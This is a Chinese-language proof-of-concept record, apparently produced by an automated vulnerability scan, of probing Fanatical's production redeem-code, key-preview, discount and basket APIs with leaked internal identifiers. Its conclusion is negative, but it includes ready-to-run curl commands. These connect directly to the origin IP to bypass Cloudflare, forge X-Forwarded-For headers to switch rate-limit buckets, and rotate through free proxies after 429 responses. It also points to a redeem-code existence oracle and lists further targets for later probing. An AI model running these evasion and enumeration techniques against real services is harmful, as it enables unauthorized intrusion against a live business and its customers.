# Fanatical key-preview 泄露的内部标识（batch_id/free_redeem_code/supplier_id）二次利用证否

- **code**: fanatical-key-preview-泄露的内部标识-batch_id-free_redeem_code-supp
- **kind**: poc
- **category**: info-leak
- **component**: Fanatical redeem-code / key-preview API
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Linux curl，fanatical.com 双通道实测：ws15 源站直连（--noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 + Host: ws15.fanatical.com + X-Forwarded-Host: www.fanatical.com + 唯一伪造 X-Forwarded-For）与 www 边缘（出口 IP 直连 429，经免费 HTTP 代理轮换出口）。真实标识 free_redeem_code=69a5ade80cfc3d5ed0364536、batch_id=b09f5e2d-c7a0-4b42-aa0a-8a4b3f937131、6 个 supplier_id 及大小写/去连字符变体：POST /api/redeem-code/search 全部 400/33B Invalid redeem code（与随机码同）；GET /api/redeem-code/get-featured-data/{v} 全部 500/29B Batch not found；GET /api/products/key-preview/{v}/en 全部 500/30B Unexpected Error（与不存在 ObjectId 同构）；POST /api/user/redeem-code/redeem 恒 401 Missing/Invalid authorization header（鉴权为 Authorization 头）；POST /api/discount 恒 400/95B Invalid discount code；无任何 200 业务回显、无分级、时序无差异。勘误补充（2026-11-11，finding#163 → KB #686）：上述 redeem-code/search 的「无分级」仅对 24hex ObjectId 输入成立；真实兑换页的 RC+12 位码存在两分支（30B Redeem code used vs 33B Invalid redeem code），本条主结论（内部标识不能当码用）不受影响。
- **path**: pocs/fanatical-key-preview-泄露的内部标识-batch_id-free_redeem_code-supp/poc.md
- **tags**: fanatical, redeem-code, key-preview, free_redeem_code, batch_id, supplier_id, negative, oracle, heroku-origin, x-forwarded-for
- **created_at**: 2026-11-11T20:59:02.256Z
- **engine**: https://www.fanatical.com/api/redeem-code/search
- **found_by**: vuln-scan

## 描述

从生产 /api/products/key-preview（不校验 key、可匿名读归档商品 JSON）取到的内部标识 batch_id/free_redeem_code/supplier_id，在所有匿名兑换/折扣/商品端点均无差异化回显，不能作为兑换码 oracle、不能跨实体解析批次或商品、不能在免登录状态下核销。注意限界：redeem-code/search 的「无分叉」只对 24 位 hex ObjectId 形态成立；真实 RC+12 位兑换码另存在性 oracle（KB #686），不要把本条误读为「该接口没有 oracle」。

## 用法

```
判据：先在 key-preview 取归档商品 JSON（无 key 也 200），提取 batch_id/free_redeem_code/supplier_id，然后按上表七个端点两通道各打一次；若全部 400/500/401/404 且与随机码、不存在 ObjectId 同码同长同文，即「内部标识二次利用」为阴性，不必再投入。别把 500 Batch not found 或 401 当可利用信号。注意：本判据中的 redeem-code/search 阴性只适用于 24hex ObjectId；要测真实兑换码是否存在，用 RC+12 位码并按 KB #686 的 30B/33B 分支判读。
```

## 正文

```
# 结论（负面情报）

`/api/products/key-preview/{id}/{lang}` 泄露的 `batch_id` / `free_redeem_code` / `supplier_id` **无匿名二次利用价值**。已实测穷尽：

| 端点 | 真实标识结果 | 随机/不存在对照 | 判据 |
|---|---|---|---|
| POST /api/redeem-code/search `{"code":X}`（X=24hex ObjectId 形态） | 400 / 33B `{"message":"Invalid redeem code"}` | 同码同长同文 | 该输入形态无有效/过期/已使用分级（**真实 RC+12 位码有分叉，见下方勘误**） |
| GET /api/redeem-code/get-featured-data/{X} | 500 / 29B `{"message":"Batch not found"}` | 同 | 批次不可解析 |
| GET /api/products/key-preview/{X}/en | 500 / 30B `{"message":"Unexpected Error"}` | 与 000…0 同 | 非商品 ObjectId |
| GET /api/products/{X} | 404 / 23B | 同 | 该路由只认 slug |
| POST /api/user/redeem-code/redeem | 401 / 28B Missing 或 Invalid authorization header | 同 | 鉴权（Header）先于业务校验 |
| POST /api/discount `{"discountCode":X}` | 400 / 95B Invalid discount code | 同 | 无抵扣 |
| POST /api/basket `productId=X` | 400 / 59B E2 Product not found | 同 | — |

# 勘误（2026-11-11，finding#163 / KB #686）

上表第一行「无有效/过期/已使用分级」**只对 24 位 hex ObjectId 输入成立**，不能推广到整个接口：

- `free_redeem_code`（如 `69a5ade80cfc3d5ed0364536`）是 24hex 内部字段，不是兑换页输入的码形态；
- 兑换页真实码是 **`RC` + 12 位 base62**（共 14 字符），对该形态服务端存在两分支：
  - 真实存在且已使用 → `400 / 30B {"message":"Redeem code used"}`
  - 不存在 → `400 / 33B {"message":"Invalid redeem code"}`
- 因此 **不要把本条读成「/api/redeem-code/search 没有 oracle」**。要测真实码的存在性，
  按 KB #686（`fanatical-redeem-code-search-existence-oracle-real-rc-codes`）执行。
- 本条主结论不变：key-preview 泄露的 batch_id / free_redeem_code / supplier_id
  在匿名状态下不能跨实体解析、不能核销、不能作为内部标识 oracle。

# 复测命令（两通道）

```bash
UA="$ARTEX_UA"; ANON=$(cat /proc/sys/kernel/random/uuid)
# 通道 B：Heroku 源站直连（绕 Cloudflare；XFF 首值换限流桶）
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: 198.51.100.$RANDOM" -H "anonid: $ANON" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"code":"69a5ade80cfc3d5ed0364536"}' \
  https://ws15.fanatical.com/api/redeem-code/search
# → 400 33B Invalid redeem code

curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: 198.51.100.$RANDOM" \
  https://ws15.fanatical.com/api/redeem-code/get-featured-data/b09f5e2d-c7a0-4b42-aa0a-8a4b3f937131
# → 500 29B Batch not found

# 通道 A：www 边缘（出口 IP 若 429，用任意未烧毁 HTTP 代理换出口）
curl -sk --proxy http://<proxy>:<port> -A "$UA" -H "anonid: $ANON" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"code":"69a5ade80cfc3d5ed0364536"}' \
  https://www.fanatical.com/api/redeem-code/search
# → 400 33B Invalid redeem code
```

# 关键旁证

- `/api/products/key-preview/{已发布id}/en?key=<任意值>` 恒 200 且长度与无 key 完全相同 → key 参数不参与校验（#2548/#2629 同结论）。
- 前端源码中 `free_redeem_code` 唯一消费点是 `all.js` 的 `SELECTABLE_FREE_PRODUCTS = (freeProducts||[]).find(fp => fp.free_redeem_code)`，属营销/免费赠品筛选语义。
- `POST /api/user/redeem-code/redeem` 的鉴权形态是 **Authorization 请求头**（非 Cookie）；取得合法 atok 后可回捡本测试集重放。

# 后续可捡

- `/api/all-promotions/{lang}` 匿名可读（84KB，含 freeProducts/saleRecords/vouchers），本轮仅作语义旁证，未做参数深挖。
- 6 个 supplier_id 均为 24hex ObjectId，可作供应商身份候选，若后续出现供应商侧入口再验。
```
